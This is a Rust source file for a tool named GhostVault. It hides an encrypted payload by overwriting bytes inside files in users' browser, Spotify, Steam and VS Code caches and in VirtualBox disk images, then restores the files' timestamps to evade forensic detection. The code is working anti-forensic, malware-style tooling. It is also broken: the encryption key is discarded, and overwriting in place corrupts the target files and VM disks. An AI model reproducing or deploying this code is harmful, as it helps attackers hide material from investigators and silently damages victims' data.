use anyhow::{anyhow, Result};
use rand::RngCore;
use std::fs;
use std::path::PathBuf;
use walkdir::WalkDir;
use rand::Rng;
use std::ffi::CString;
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305, AeadCore,
};

const STEGANO_PATHS: &[&str] = &[
    "~/.cache/spotify/Storage/",
    "~/.mozilla/firefox/*.default-release/startupCache/",
    "~/.local/share/Steam/steamapps/shadercache/",
    "~/.config/Code/User/globalStorage/",
    "~/.config/Google/Chrome/Default/Service Worker/",
];

#[derive(Debug, Clone)]
pub struct DetachedHeader {
    pub nonce: [u8; 24],
    pub salt: [u8; 32],
    pub integrity_hash: [u8; 32],
}

impl DetachedHeader {
    pub fn new() -> Self {
        let mut rng = rand::thread_rng();
        let mut nonce = [0u8; 24];
        let mut salt = [0u8; 32];
        let mut integrity_hash = [0u8; 32];
        rng.fill_bytes(&mut nonce);
        rng.fill_bytes(&mut salt);
        rng.fill_bytes(&mut integrity_hash);
        DetachedHeader {
            nonce,
            salt,
            integrity_hash,
        }
    }

    pub fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(88);
        bytes.extend_from_slice(&self.nonce);
        bytes.extend_from_slice(&self.salt);
        bytes.extend_from_slice(&self.integrity_hash);
        bytes
    }

}

pub struct GhostVault {
    target_paths: Vec<PathBuf>,
}

impl GhostVault {
    pub fn new() -> Result<Self> {
        let mut target_paths = Vec::new();
        for path_str in STEGANO_PATHS {
            let expanded = shellexpand::tilde(path_str).to_string();
            let path = PathBuf::from(&expanded);
            if path.exists() {
                target_paths.push(path);
            }
        }
        if let Ok(home) = std::env::var("HOME") {
            let vm_path = PathBuf::from(home).join("VirtualBox VMs");
            if vm_path.exists() {
                for entry in WalkDir::new(&vm_path)
                    .into_iter()
                    .filter_map(|e| e.ok())
                {
                    if entry.path().extension().map_or(false, |ext| {
                        ext == "vmdk" || ext == "qcow2" || ext == "vdi"
                    }) {
                        target_paths.push(entry.path().to_path_buf());
                    }
                }
            }
        }
        Ok(GhostVault {
            target_paths,
        })
    }

    pub fn inject_payload(&self, payload: &[u8]) -> Result<PathBuf> {
        if self.target_paths.is_empty() {
            return Err(anyhow!("No suitable target paths found"));
        }
        let mut rng = rand::thread_rng();
        let target_idx = rng.gen_range(0..self.target_paths.len());
        let target_path = &self.target_paths[target_idx];

        // --- TIMESTOMPING START ---
        // Capture original timestamps
        let metadata = fs::metadata(target_path)?;
        let atime = metadata.accessed()?;
        let mtime = metadata.modified()?;

        let file_data = fs::read(target_path)?;

        // Encrypt payload with XChaCha20Poly1305 instead of XOR
        // Generate ephemeral key for this injection
        let mut key = [0u8; 32];
        rng.fill_bytes(&mut key);
        let cipher = XChaCha20Poly1305::new(&key.into());
        let nonce = XChaCha20Poly1305::generate_nonce(&mut rand::rngs::OsRng);

        let encrypted_payload = cipher.encrypt(&nonce, payload)
            .map_err(|e| anyhow!("Encryption failed: {}", e))?;

        // Prepend nonce to payload so we can decrypt later (if we implemented extraction)
        let mut final_payload = Vec::with_capacity(24 + encrypted_payload.len());
        final_payload.extend_from_slice(nonce.as_slice());
        final_payload.extend_from_slice(&encrypted_payload);

        let injection_point = self.find_injection_point(&file_data, final_payload.len())?;

        // We need mutable data
        let mut new_file_data = file_data.clone();

        // Inject (overwrite)
        // Ensure we don't go out of bounds
        if injection_point + final_payload.len() > new_file_data.len() {
             return Err(anyhow!("Injection payload too large for target"));
        }

        for (i, &byte) in final_payload.iter().enumerate() {
            new_file_data[injection_point + i] = byte;
        }

        fs::write(target_path, new_file_data)?;

        // --- TIMESTOMPING RESTORE ---
        self.restore_timestamps(target_path, atime, mtime)?;

        Ok(target_path.clone())
    }

    fn restore_timestamps(&self, path: &PathBuf, atime: std::time::SystemTime, mtime: std::time::SystemTime) -> Result<()> {
        let atime_ts = timespec_from_system_time(atime);
        let mtime_ts = timespec_from_system_time(mtime);
        let times = [atime_ts, mtime_ts];

        let c_path = CString::new(path.to_string_lossy().as_bytes())?;

        unsafe {
            if libc::utimensat(libc::AT_FDCWD, c_path.as_ptr(), times.as_ptr(), 0) < 0 {
                 return Err(anyhow!("Timestomping failed: {}", std::io::Error::last_os_error()));
            }
        }
        Ok(())
    }

    fn find_injection_point(&self, data: &[u8], payload_size: usize) -> Result<usize> {
        if data.len() < payload_size + 100 {
            return Err(anyhow!("File too small for injection"));
        }
        let mut best_point = 0;
        let mut best_entropy = 0.0;
        let window_size = 256;
        let step = 64;
        for i in (0..=(data.len() - payload_size - window_size)).step_by(step) {
            let window = &data[i..i + window_size];
            let entropy = self.calculate_entropy(window);
            if entropy > best_entropy {
                best_entropy = entropy;
                best_point = i + window_size / 2;
            }
        }
        if best_point + payload_size > data.len() {
            best_point = data.len() - payload_size - 1;
        }
        Ok(best_point)
    }

    fn calculate_entropy(&self, data: &[u8]) -> f64 {
        let mut freq = [0usize; 256];
        for &byte in data {
            freq[byte as usize] += 1;
        }
        let len = data.len() as f64;
        let mut entropy = 0.0;
        for &count in &freq {
            if count > 0 {
                let p = count as f64 / len;
                entropy -= p * p.log2();
            }
        }
        entropy
    }

}

fn timespec_from_system_time(t: std::time::SystemTime) -> libc::timespec {
    match t.duration_since(std::time::UNIX_EPOCH) {
        Ok(d) => libc::timespec {
            tv_sec: d.as_secs() as libc::time_t,
            tv_nsec: d.subsec_nanos() as libc::c_long,
        },
        Err(_) => libc::timespec { tv_sec: 0, tv_nsec: 0 },
    }
}
